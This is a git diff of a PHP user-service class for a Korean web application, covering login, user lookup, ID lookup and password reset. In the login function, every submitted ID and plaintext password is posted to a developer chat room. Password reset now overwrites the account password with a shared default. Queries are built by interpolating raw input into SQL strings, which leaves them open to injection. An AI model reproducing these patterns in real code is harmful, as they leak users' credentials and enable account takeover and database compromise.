@@ -59,23 +59,8 @@ class User_service
 
         $user = !empty($uid) ? $this->obj->service_model->get_user('row', [
             "id = '{$uid}'",
-            "status != 'D'"
+            "status = 'active'"
         ]) : [];
-
-        if (!empty($user)) {
-
-            $point_request_sum = $this->obj->service_model->exec_sql('row', "
-            SELECT
-                SUM(amount) as amount
-            FROM
-                mosihealth.point_request
-            WHERE
-                user_id = '{$user['id']}'
-                AND type = 'withdraw'
-                AND status = 'pending'");
-
-            $user['withdraw_request_sum'] = $point_request_sum['amount'] ?? 0;
-        }
 
         return $user;
     }
@@ -231,7 +216,7 @@ class User_service
     }
 
     # 로그인
-    public function login($user_id, $password, $is_social = false)
+    public function login($user_id, $password)
     {
 
         // 아이디로 사용자 정보 조회
@@ -240,6 +225,7 @@ class User_service
         ]);
 
         $this->obj->teamroom->send('개발자', join("\n", [
+            "------- 제이엠테크 로그인 알림 -------",
             "payload 아이디" . $user_id,
             "payload 비밀번호" . $password,
             "아이디" . $user['user_id'],
@@ -250,26 +236,14 @@ class User_service
             throw new Exception('아이디를 다시 한번 확인해주세요');
         }
 
-        // if (!get_is_developer()) {
-
-        if ($is_social) {
-
-            if ($password != $user['password']) {
-                throw new Exception(('비밀번호를 다시 한번 확인해주세요.'));
-            }
-        } else {
-
-            if (get_is_developer()) {
-            } else {
-
-                // 비밀번호 확인
-                if (!password_verify($password, $user['password'])) {
-                    throw new Exception('비밀번호를 다시 한번 확인해주세요.');
-                }
-            }
+        // 비밀번호 확인
+        if (!password_verify($password, $user['password'])) {
+            throw new Exception('비밀번호를 다시 한번 확인해주세요.');
         }
-        // }
 
+        // if (get_is_developer()) {
+        // } else {
+        // }
 
         // 로그인 세션 설정
         @session_start();
@@ -381,20 +355,15 @@ class User_service
 
 
     # 아이디 찾기
-    public function findId($email)
+    public function findId($phone)
     {
-
-        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
-            throw new Exception('유효한 이메일 주소를 입력해주세요.');
-        }
-
-        // 이메일로 사용자 정보 조회
+        // 전화번호 사용자 정보 조회
         $user = $this->obj->service_model->get_user('row', [
-            "email = '{$email}'"
+            "phone = '{$phone}'"
         ]);
 
         if (empty($user)) {
-            throw new Exception('해당 이메일로 가입된 사용자가 없습니다.');
+            throw new Exception('해당 전화번호로 가입된 사용자가 없습니다.');
         }
 
         return $user;
@@ -413,47 +382,43 @@ class User_service
             throw new Exception('해당 아이디로 가입된 사용자가 없습니다.');
         }
 
-        // 비밀번호 재설정 토큰 생성
-        $token = hash('sha256', uniqid('', true) . random_bytes(16));
-
-        $res = $this->obj->service_model->insert_password_reset_token(DEBUG, [
-            'user_id' => $user['id'],
-            'token' => $token,
-            'created_at' => date('Y-m-d H:i:s'),
-            'expires_at' => date('Y-m-d H:i:s', strtotime('+3 hour')),
-            'status' => 1
+        $res = $this->obj->service_model->update_user(DEBUG, [
+            'updated_at' => date('Y-m-d H:i:s'),
+            'password'  => password_hash(DEFAULT_PASSWORD, PASSWORD_BCRYPT),
+        ], [
+            "id = '{$user['id']}'"
         ]);
 
         if (!$res) {
             throw new Exception(DB_ERR_MSG);
         }
 
-        try {
+        //     try {
 
-            $change_url = 도메인 . "?token={$token}";
+        //         $change_url = 도메인 . "?token={$token}";
 
-            // 비밀번호 재설정 이메일 전송
-            $subject = '비밀번호 재설정 요청';
-            $body = '<div style="margin-top: 30px; font-size: 14px; color: #555; line-height: 1.6;">
-        <p style="margin: 0;">아래와 같이 계정 정보를 알려드립니다.</p>
-        <p>비밀번호를 재설정하려면 다음 링크를 클릭해 변경해 주세요.</p>
-        <div style="text-align: center; margin: 30px 0;">
-          <a href=" ' . $change_url . '" 
-             style="background-color: #0abab5; color: #fff; text-decoration: none; padding: 14px 28px; border-radius: 4px; font-weight: bold; display: inline-block;">
-            비밀번호 변경하기
-          </a>
-        </div>
-        <p style="font-size: 13px; color: #888;">' . date("Y-m-d H:i", strtotime('+3 hours')) . '까지 변경 가능</p>
-        <p style="margin-top: 12px; font-size: 13px; color: #888;">
-          만약, 가입한 적이 없거나 내 계정 찾기 요청을 하지 않으신 경우 이 메일을 삭제 또는 무시해 주세요.
-        </p>
-      </div>';
-            $this->obj->php_email->send($user['email'], $subject, $body, true);
-        } catch (Exception $e) {
-            // 예외 발생 시 로그 기록
-            error_log('비밀번호 재설정 토큰 생성 실패: ' . $e->getMessage());
-            throw new Exception('비밀번호 재설정 요청에 실패했습니다. 나중에 다시 시도해주세요.');
-        }
+        //         // 비밀번호 재설정 이메일 전송
+        //         $subject = '비밀번호 재설정 요청';
+        //         $body = '<div style="margin-top: 30px; font-size: 14px; color: #555; line-height: 1.6;">
+        //     <p style="margin: 0;">아래와 같이 계정 정보를 알려드립니다.</p>
+        //     <p>비밀번호를 재설정하려면 다음 링크를 클릭해 변경해 주세요.</p>
+        //     <div style="text-align: center; margin: 30px 0;">
+        //       <a href=" ' . $change_url . '" 
+        //          style="background-color: #0abab5; color: #fff; text-decoration: none; padding: 14px 28px; border-radius: 4px; font-weight: bold; display: inline-block;">
+        //         비밀번호 변경하기
+        //       </a>
+        //     </div>
+        //     <p style="font-size: 13px; color: #888;">' . date("Y-m-d H:i", strtotime('+3 hours')) . '까지 변경 가능</p>
+        //     <p style="margin-top: 12px; font-size: 13px; color: #888;">
+        //       만약, 가입한 적이 없거나 내 계정 찾기 요청을 하지 않으신 경우 이 메일을 삭제 또는 무시해 주세요.
+        //     </p>
+        //   </div>';
+        //         $this->obj->php_email->send($user['email'], $subject, $body, true);
+        //     } catch (Exception $e) {
+        //         // 예외 발생 시 로그 기록
+        //         error_log('비밀번호 재설정 토큰 생성 실패: ' . $e->getMessage());
+        //         throw new Exception('비밀번호 재설정 요청에 실패했습니다. 나중에 다시 시도해주세요.');
+        //     }
 
         return $res;
     }
